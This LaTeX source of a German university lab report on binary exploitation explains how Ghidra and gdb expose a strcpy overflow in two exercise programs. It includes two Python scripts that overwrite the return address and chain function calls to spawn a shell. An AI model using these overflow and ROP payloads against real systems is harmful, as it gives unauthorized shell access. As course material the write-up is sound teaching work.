\NeedsTeXFormat{LaTeX2e}
\documentclass[a4paper,12pt,
headsepline,           % Linie zw. Kopfzeile und Text
oneside,               % zweiseitig
pointlessnumbers,      % keine Punkte nach den letzten Ziffern in Überschriften
bibtotoc,              % LV im IV
%DIV=15,               % Satzspiegel auf 15er Raster, schmalere Ränder   
BCOR15mm               % Bindekorrektur
%,draft
]{scrbook}
\KOMAoptions{DIV=last} % Neuberechnung Satzspiegel nach Laden von Paket helvet

\pagestyle{headings}
\usepackage{blindtext}

% für Texte in deutscher Sprache
\usepackage[ngerman]{babel}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}

% Helvetica als Standard-Dokumentschrift
\usepackage[scaled]{helvet}
%\usepackage{mathptmx}
\renewcommand{\familydefault}{\sfdefault} 

\usepackage{graphicx}

% Für Tabellen mit fester Gesamtbreite und variabler Spaltenbreite
\usepackage{tabularx} 

% Besondere Schriftauszeichnungen
\usepackage{url}              % \url{http://...} in Schreibmaschinenschrift
\usepackage{color}            % zum Setzen farbigen Textes

\usepackage{amssymb, amsmath} % Pakete für Mathe-Umgebungen und -Symbole

\usepackage{setspace}         % Paket für div. Abstände, z.B. ZA
%\onehalfspacing              % nur dann, wenn gefordert; ist sehr groß!!
\setlength{\parindent}{0pt}   % kein linker Einzug der ersten Absatzzeile
\setlength{\parskip}{1.4ex plus 0.35ex minus 0.3ex} % Absatzabstand, leicht variabel

% Tiefe, bis zu der Überschriften in das Inhaltsverzeichnis kommen
\setcounter{tocdepth}{3}      % ist Standard


%\usepackage[printonlyused, withpage]{acronym}
\usepackage[printonlyused]{acronym}
\usepackage{comment}
\usepackage{longtable}
%\usepackage[maxdepth=8, mark]{gitinfo2}
\usepackage{bytefield}
\usepackage{smartdiagram}
\usepackage{caption}
\usepackage{hyperref}
\usepackage{hypcap}
\usepackage{graphicx}
\usepackage{tikz}
\usepackage{mathtools}
\usepackage{colortbl}
\usepackage{xcolor}
\usepackage[outline]{contour}
\usetikzlibrary{arrows}
\usetikzlibrary{calc,positioning,shapes,decorations.pathreplacing, matrix, backgrounds, fit}

% hier Namen etc. einsetzen
\newcommand{\fullname}{Björn Petersen}
\newcommand{\email}{bjoern.petersen@uni-ulm.de}
\newcommand{\titel}{Darstellung und Analyse SoC interner Kommunikationskanäle auf Protokollebene}
\newcommand{\jahr}{2020}
\newcommand{\matnr}{941984}
\newcommand{\gutachterA}{Prof.\,Dr.-Ing\,Maurits Ortmanns}
\newcommand{\gutachterB}{Dr.\,rer.\,nat.\,Dipl.-Ing\,Endric Schubert}
\newcommand{\betreuer}{Dipl-Ing\, Ulrich Langenbach}

% hier die Fakultät auswählen
%\newcommand{\fakultaet}{---  Im Quellcode anpassen nicht vergessen! ---}
\newcommand{\fakultaet}{Ingenieurwissenschaften, Informatik und\\Psychologie}
%\newcommand{\fakultaet}{Mathematik und\\Wirtschafts-\\wissenschaften}
%\newcommand{\fakultaet}{Medizin}
%\newcommand{\fakultaet}{Naturwissenschaften}

% hier das Institut einsetzen
\newcommand{\institut}{Institut für Mikroelektronik}

% Informationen, die LaTeX in die PDF-Datei schreibt
\pdfinfo{
  /Author (\fullname)
  /Title (\titel)
  /Producer     (pdfeTex 3.14159-1.30.6-2.2)
  /Keywords ()
}

\usepackage{hyperref}
\hypersetup{
pdftitle=\titel,
pdfauthor=\fullname,
pdfsubject={Diplomarbeit},
pdfproducer={pdfeTex 3.14159-1.30.6-2.2},
colorlinks=false,
pdfborder=0 0 0	% keine Box um die Links!
}

\usepackage{listings}
\lstset{
  language=python,
  basicstyle=\ttfamily,
  columns=fullflexible,
  frame=single,
  breaklines=true,
  postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space}
}

% Trennungsregeln
\hyphenation{Sil-ben-trenn-ung}

\title{Binary Exploitation with ROP}
\date{Juli 20, 2020}
\author{Björn Petersen}

\begin{document}

\maketitle

\section*{Erste Schritte}
Die Software kann mithilfe von Ghidra dekompiliert werden und man kann sich den Quellcode genauer anschauen. Hierbei fällt auf, dass die in der Funktion \texttt{countAndPrint} ein \texttt{strcpy} befehl ausgeführt wird, ohne genau zu überprüfen wielange kopiert wird. Dies ist eine Schwachstelle, da so der STack der Funktion manipuliert werden kann. Außerdem gibt es eine zweite weitere Funktion \texttt{openBash}, welche eine Kommandozeile öffnet. Nun kann der Stack von \texttt{countAndPrint} so manipuliert werden, dass die Funktion \texttt{openBash} aufgerufen wird. Durch Ghidra kann man herausfinden, dass die Adresse dafür \texttt{0x080484B6} ist. 
Nun lässt sich noch abschätzen wielange der Buffer sein muss, um den Funktionszeiger zu überschreiben. Der Buffer im Code ist die erste Variable, somit liegen davor keine Daten und ist 50 char lang. 

Bei dem testen des Bufferoverflows wird ein kleiner Python Skript verwendet um dies zu machen. Folgendes Skript wurde hierfür verwendet:
\begin{lstlisting}
import sys
import os
import struct

address = 0x080484b6
buffer = 70*b"a"

os.system(b"./aufgabe1 " + buffer + struct.pack("I", address))
\end{lstlisting}

Die größe des Buffers mit 70 wurde experimentell herausgefunden, aber der Buffer muss den Stack Pointer überschreiben, so wie das Nullbyte und den Buffer im Code füllen.

\section*{ROP mit Argumenten}
Als erstes wird das Programm wieder mit Ghidra dekompiliert und genauer betrachtet. Es existiert immernoch die FUnktion \texttt{countAndPrint} aber die Methode \texttt{openBash} ist nicht mehr vorhanden. Statt dessen gibt es die Methode \texttt{executeCommand}, welche den Befehl \texttt{system()} enthält, was auffällig ist und somit der erste Ansatz für einen Angriff ist. Die Methode \texttt{executeCommand} wird wieder mit hilfe eines Bufferoverflow aufgerufen wie in Aufgabe 1. 
Wird die Methode aufgerufen, wird als erstes überprüft, ob der übergebene Parameter mit einem von Zwei hinterlegten Werten passt, die den weiteren Verlauf der Methode bestimmen. Nun wird probiert mit einem zweiten Bufferoverflow eine der beiden if Abfragen auf true zu setzen, so dass der Aufruf \texttt{concat} aufgerufen werden kann, welcher zwei Strings konkatiniert und den resultierend zurückgibt. Durch anhalten bei diesem Aufruf mit \texttt{gdb} fallen zwei Adresssen auf, welche durch Ghidra dem String \texttt{date} und \texttt{sh} zuzuordnen sind. Des weiteren fällt auf, dass die Funktion eine Shell öffnet, wenn ihr \texttt{0xcafebabe} übergeben wird. Nun wird versucht den Befehl \texttt{system()} mit der variable \texttt{sh} aufzurufen, was eine Shell öffnet. Der Overflow muss also nun als erstes mit 70 Zeichen wieder den Buffer überschreiben, dann die Adresse von \texttt{setGlobalDirectory}, anschließend die Adresse von \texttt{executeCommand}, danach Argumente für \texttt{setGlobalDirectory} und schlussendlich die Argumente für \texttt{executeCommand}. Das nachfolgende Skript wurde verwendet um dies zu erreichen:

\begin{lstlisting}
    import sys
    import os
    import struct

    setGDAdresse = 0x80485f9
    executeCommandAdresse = 0x804858e
    setGDArg = 0x080487e7
    exeCommandArg = 0xcafebabe

    os.system(b"./aufgabe2 " + b"a"*70 + struct.pack("I", setGDAdresse) + struct.pack("I", executeCommandAdresse) + struct.pack("I", setGDArg) + struct.pack("I", exeCommandArg) + b'\0')
\end{lstlisting}


\end{document}
